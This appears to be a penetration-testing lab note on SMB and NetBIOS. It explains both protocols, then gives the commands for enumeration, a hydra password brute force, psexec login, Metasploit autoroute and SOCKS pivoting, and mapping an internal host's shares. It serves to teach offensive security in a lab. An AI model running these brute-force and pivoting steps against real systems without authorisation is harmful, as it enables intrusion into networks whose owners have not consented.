# SMB & NetBIOS Enumeration

* NetBIOS and SMB are two different technologies, but they are related in the context of networking and file sharing on Windows networks.

## NetBIOS (Network Basic Input/Output System)

* NetBIOS is an API and a set of network protocols for providing communication services over a local network. It is used primarily to allow applications on different comuters to find and interact with each other on a network.

Functions: NetBIOS offers three primary services:

* <mark style="color:red;">Name Service (NETBIOS-SN):</mark> Allows computers to register, unregister and resolve names in a local network.
* <mark style="color:red;">Datagram Service (NETBIOS-DGM)</mark>: Supports connectionless communication and broadcasting.
* <mark style="color:red;">Session Service (NetBIOS-SSN):</mark> Supports connection-oriented communication for more reliable data transfers

Ports: NetBIOS typically uses ports <mark style="color:blue;">137</mark> (Name Service), <mark style="color:blue;">138</mark> (Datagram Service) and <mark style="color:blue;">139</mark> (Session Service) over UDP and TCP.

## SMB (Server Message Block)

* SMB is a network file sharing protocol that allows computers on a network to share files, printers and other resources. It is the primary protocol used in Windows networks for these purposes.

#### Functions:

* SMB provides for file and printer sharing, named pipes and inter-process communication (<mark style="color:red;">IPC</mark>). It allows users to access files on remote computers as if they were local

#### Versions:

* <mark style="color:blue;">SMB 1.0</mark>: The original version, which had security vulnerabilities. It aws used with older OS like Windows XP.
* <mark style="color:blue;">SMB 2.0/2.1:</mark> Introduced with Windows Vista/Windows Server 2008, offering improved performance and security
* <mark style="color:blue;">SMB 3.0:</mark> Introduced with Windows 8/Windows Server 2012, adding features like encryption, multichannel support and improvements for virtualization.

#### Ports:

* SMB generally uses port 445 for direct SMB traffic (bypassing NetBIOS) and port 139 when operating with NetBIOS.

## SMB & NetBIOS Enumeration

* While NetBIOS and MSB were once closely linked, modern network rely primarily on SMB for file and printer sharing, often using DNS and other mechanisms for name resolution instead of NetBIOS.
* Modern implementations of Windows primarily use SMB and can workwithout NetBIOS, hoever, NetBIOS over TCP 139 is required for backward compatibility and are often enabled together.

## Practice Demo

In this case we will gain access to one machine and then pivot into an internal one.

Start by enumerating the target with nmap.

We find SMB and NetBIOS open.

## NetBIOS Enumeration

### Using nbtscan

Scans networks for NetBIOS name information

* <mark style="color:yellow;">nbtscan 'targetnetwork/24'</mark>

### Using nmblookup

* <mark style="color:yellow;">nmblookup -A targetIP</mark>

### Using nbstat nmap script

* <mark style="color:yellow;">nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n targetIP</mark>

## Starting SMB Enumeration

Nmap scan ports 139,445 with -sV

### Using NSE

* <mark style="color:yellow;">nmap -p445 --script smb-protocols targetIP</mark>&#x20;

### Identify the SMB protocol Security Level

* <mark style="color:yellow;">nmap -p445 --script smb-security-mode targetIP</mark>&#x20;

Gives  you account details

### Using smbclient

#### Trying for anonymous login:

* <mark style="color:yellow;">smbclient -L targetIP</mark>

#### Now we can do user enumeration through the SMB service:

* <mark style="color:yellow;">nmap -p445 --script smb-enum-users targetIP</mark>

#### Create a text file with the enumerated users and use hydra to perform a bruteforce attack:

* <mark style="color:yellow;">hydra -L nameofusersfile -P /usr/share/metassploit-framework/data/wordlists/unix\_passwords.txt targetIP smb</mark>

We can now use the psexec.py script to login using the obtained credentials.&#x20;

We can also use the <mark style="color:red;">exploit/windows/smb/psexec</mark> metasploit module.

\-------------------------------------------------------------------------------

### Pivoting into the internal system from the first target

We start by pinging the second target's IP

#### Add the network route to the second target via the first compromised target:

<mark style="color:red;">SUPER IMPORTANTTTT</mark>

* <mark style="color:yellow;">run autoroute -s networkIPofsecondtarget/24</mark>

### Using Metasploit module

<mark style="color:blue;">Using this module ensures that yo can run any tool on the second target machine.</mark>

* <mark style="color:yellow;">auxiliary/server/socks\_proxy:</mark> Sets up a SOCKS proxy server on your local machine.

When setting the options take a look at the proxychains config file to see the port and version.

<mark style="color:purple;">NOTE:</mark> Set the options having in mind the port and version of the proxychains installed on your attacker machine.

#### After running the module we run:

* <mark style="color:yellow;">nmap targetofinternaltarget -sT -Pn- sV -p 445</mark>

We identify a Windows system running on the second target

#### Using <mark style="color:red;">net viewb</mark> to view all the resource shared by the second target (RUN IN THE FIRST MACHINE)

* <mark style="color:yellow;">net view secondtargetIP</mark>

#### In this case we have "access denied", to bypass this we migrate to "<mark style="color:red;">explorer.exe</mark>" and are able to net view.

* <mark style="color:yellow;">migrate -N explorer.exe</mark>

<mark style="color:purple;">NOTE:</mark> In this case we had to "deescalate" privileges to the explorer.exe process because NT\AUTHORITY SYSTEM <mark style="color:red;">does not</mark> have <mark style="color:red;">network credentials</mark> like a normal user would.

### Use enumerated shares

* <mark style="color:yellow;">net use D: \\\\'secondtarget'\\'nameofshare'</mark>
* <mark style="color:yellow;">net use K: \\\\'secondtargetIP'\\'nameofsecondshare'</mark>

<mark style="color:blue;">With these 2 commands we are mapping the available shares from the internal target to a drive on our exploited first target, so we can access them.</mark>

Now we can list those disks

* <mark style="color:yellow;">dir K:</mark>
